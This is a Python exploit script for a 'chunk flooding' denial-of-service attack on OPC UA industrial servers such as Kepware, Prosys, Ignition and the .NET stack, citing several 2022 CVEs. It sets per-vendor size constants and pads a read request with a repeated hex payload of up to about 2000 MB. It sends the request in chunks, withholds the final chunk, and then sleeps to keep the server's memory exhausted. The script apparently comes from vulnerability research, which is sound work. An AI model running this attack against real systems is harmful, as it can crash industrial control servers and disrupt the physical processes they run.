# Chunk Flooding Attack
#   Sending huge amount of chunks without the Final chunk.
#
# CVEs:
#   - CVE-2022-29864: https://files.opcfoundation.org/SecurityBulletins/OPC%20Foundation%20Security%20Bulletin%20CVE-2022-29864.pdf
#   - CVE-2022-21208: https://security.snyk.io/vuln/SNYK-JS-NODEOPCUA-2988723
#   - CVE-2022-25761: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25761
#   - CVE-2022-25304: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25304
#   - CVE-2022-24381: https://security.snyk.io/vuln/SNYK-UNMANAGED-ASNEGOPCUASTACK-2988735
#   - CVE-2022-25888: https://security.snyk.io/vuln/SNYK-RUST-OPCUA-2988751

import datetime

from protocol import *
from config import *

# Kepware
MESSAGE_FACTOR_KEPWAER_MAX = 45000 # ~10 Mb
MESSAGE_CHUNK_SIZE_MAX_KEPWARE = 2000

# DOTNET (pre 1.4.368.58)
# Prosys
MESSAGE_FACTOR_DOTNET_MAX = 10000000 # ~2000 Mb
MESSAGE_CHUNK_SIZE_MAX_DOTNET = 2000

# DOTNET new version (post 1.4.368.58)
MESSAGE_FACTOR_DOTNET_2_MAX = 100000 # ~20 Mb
MESSAGE_CHUNK_SIZE_MAX_DOTNET_2 = 4000

# Ignition
MESSAGE_FACTOR_IGNITION_MAX = 710 # ~65kb (max chunk count = 64, max size = 65kb)
MESSAGE_CHUNK_SIZE_MAX_IGNITION = 3000


# Current settings
MESSAGE_FACTOR_DEFAULT = MESSAGE_FACTOR_DOTNET_MAX
MESSAGE_CHUNK_SIZE = MESSAGE_CHUNK_SIZE_MAX_DOTNET

def attack(server_details, message_factor=MESSAGE_FACTOR_DEFAULT, max_chunk_size=MESSAGE_CHUNK_SIZE):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.session_timeout = 3600 * 1000 # 1hr
    opcua.requested_lifetime = 3600 * 1000 # 1hr
    opcua.max_chunk_size = max_chunk_size
    opcua.create_session()

    message_header = opcua.build_opcua_message_header()
    message_body = opcua.build_opcua_message_body(type_id=1, req_id=631)
    message_body += struct.pack("<Q", 0) # Max age
    message_body += struct.pack("<I", 3) # Timestamp to return (3 = Neither)

    # Message: Malformed version of Nodes to read (array of 12 NodeIDs)
    #nodes_to_read = bytes.fromhex("0c0000000100b73a05000000ffffffff0000ffffffff0100b93a05000000ffffffff0000ffffffff0100203e05000000ffffffff0000ffffffff0100df3c05000000ffffffff0000ffffffff01001a3d05000000ffffffff0000ffffffff01001e3d05000000ffffffff0000ffffffff0100263d05000000ffffffff0000ffffffff01002a3d05000000ffffffff0000ffffffff005e05000000ffffffff0000ffffffff01002e3c05000000ffffffff0000ffffffff005f05000000ffffffff0000ffffffff01005b0105000000ffffffff0000ffffffff")
    nodes_to_read = bytes.fromhex("000000000100b73a05000000ffffffff0000ffffffff0100b93a05000000ffffffff0000ffffffff0100203e05000000ffffffff0000ffffffff0100df3c05000000ffffffff0000ffffffff01001a3d05000000ffffffff0000ffffffff01001e3d05000000ffffffff0000ffffffff0100263d05000000ffffffff0000ffffffff01002a3d05000000ffffffff0000ffffffff005e05000000ffffffff0000ffffffff01002e3c05000000ffffffff0000ffffffff005f05000000ffffffff0000ffffffff01005b0105000000ffffffff0000ffffffff")
    message = message_header + message_body + nodes_to_read * message_factor

    # Send num_requests times
    print("[-] Sending MSG Request - Very long message ({:.2f} MB) with chunks x {} times".format(len(message)/1024/1024, 1))
    opcua.send_recv(message, count=1, should_recv=False, hold_final_chunk=True)

    print("[-] Sleeping to keep all chunks in memory (don't close)...")
    time.sleep(200000)